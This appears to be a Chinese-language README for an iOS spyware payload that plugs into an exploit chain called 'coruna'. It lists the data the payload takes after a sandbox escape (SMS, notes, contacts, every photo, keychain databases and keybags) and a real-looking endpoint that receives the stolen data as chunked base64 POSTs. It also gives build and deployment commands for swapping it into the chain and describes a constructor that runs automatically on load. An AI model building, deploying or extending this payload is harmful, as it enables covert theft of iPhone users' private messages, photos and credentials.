# coruna-collector

coruna chain 的自有载荷 dylib —— 补上原版载荷缺失的采集能力。

## 背景

原始 coruna 载荷逆向结论：

| 文件 | 大小 | 能力 |
|---|---|---|
| `bootstrap.dylib` | 89 KB | 上报存在性、Corellium 虚拟机检测 |
| `entry0_type0x08.dylib` | 88 KB | 只有 `system` / `dlsym` / `dlopen` |
| `377bed74/entry0` | 228 KB | 删崩溃日志 |

三个载荷加起来没有一行读相册、备忘录、钥匙串的代码，所以链虽然能跑到 `Sandbox escape result: 0`，采集层是空的。

这个项目补的就是这一层。

## 采集内容

```
hello       uid / user / 系统版本 / 工作目录
notes       /var/mobile/Library/Notes/NoteStore.sqlite   → ZTITLE1 / ZSNIPPET
sms         /var/mobile/Library/SMS/sms.db               → address / text
contacts    /var/mobile/Library/AddressBook/AddressBook.sqlitedb
photos      /var/mobile/Media/DCIM/100APPLE 逐张上传
keychain    keychain-2.db + System.keybag + Backup.keybag + persona.kb + usersession.kb
```

数据以分块 base64（200 KB/块）POST 到 `https://myg3z1adawtxz0s.icu/coruna-loot`。

## 构建

GitHub Actions `macos-14` runner：

```bash
xcrun --sdk iphoneos clang \
  -target arm64e-apple-ios16.0 \
  -isysroot "$(xcrun --sdk iphoneos --show-sdk-path)" \
  -dynamiclib -fobjc-arc -O2 \
  -framework Foundation -framework CoreFoundation -lsqlite3 \
  -o collector.dylib collector/collector.m
```

产物 `collector.dylib` 通过 workflow artifact 下载。

## 部署

替换链里的载荷文件：

```bash
# 1. 备份
cp payloads/f8a86cf368fdbbe294813926a2a229df041eb758/entry0_type0x08.dylib{,.orig}

# 2. 替换
cp collector.dylib payloads/f8a86cf368fdbbe294813926a2a229df041eb758/entry0_type0x08.dylib

# 3. 更新 manifest.json 中该条目的 size 字段
```

链的 `MachOPayloadBuilder` 会自动把文件封进 F00DBEEF 容器（entry type 0x08 = dylib，0x0a = 数据段），不需要手工拼装。

## 入口点

同时提供两条：

- `__attribute__((constructor))` —— `dlopen` 时自动执行
- `void _process(void)` —— 与 `bootstrap.dylib` 的符号名对齐，供按名查找的加载器使用

## 已知不确定点

1. F00DBEEF 消费方如果只 `mmap` 不 `dlopen`，构造函数不执行，需靠 `_process` 符号
2. 沙盒逃逸后能否直读 `/var/mobile/Media/DCIM` 取决于逃逸拿到的权限；读不到会返回 `{"ok":false,"err":"missing"}`，那时需要补 `sandbox_extension_issue_file`